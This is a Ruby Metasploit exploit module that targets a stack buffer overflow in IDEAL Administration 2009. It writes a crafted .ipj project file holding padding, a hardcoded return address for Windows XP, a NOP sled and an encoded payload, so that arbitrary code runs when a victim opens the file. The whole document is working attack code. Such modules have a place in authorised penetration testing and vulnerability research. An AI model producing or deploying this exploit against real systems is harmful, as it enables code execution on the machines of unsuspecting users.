require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
        
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'IDEAL Administration 2009 Buffer Overflow - Universal',
			'Description'    => %q{
					This module exploits a stack overflow in IDEAL Administration v9.7.
					By creating a specially crafted ipj file, an an attacker may be able
					to execute arbitrary code. 
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'dookie, original by Dr_IDE' ],
			'Version'        => '$Revision: 7724 $',
			'References'     =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/10319' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},					
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x3c\x22\x3e\x1a\x0a",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        => 
				[
					[ 'Windows XP Universal', { 'Ret' => 0x10010F2E } ], # ListWmi.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Dec 05 2009',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME',   [ false, 'The file name.',  'unIDEAL.ipj']),
				], self.class)

	end

	def exploit

		sploit =  "\x0D\x0A\x5B\x47\x72\x6F\x75\x70\x2C\x45\x78\x70\x6F"
		sploit << "\x72\x74\x2C\x59\x65\x73\x5D\x0D\x0A"
		sploit << "\x43\x6f\x6d\x70\x75\x74\x65\x72\x3D"
		sploit << rand_text_alpha_upper(2420)
		sploit << [target.ret].pack('V')
		sploit << "\x90" * 300
		sploit << payload.encoded
		sploit << "\x0D\x0A\x5B\x45\x6E\x64\x5D\x0D\x0A"
	
		ipj = sploit

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(ipj)   

	end

end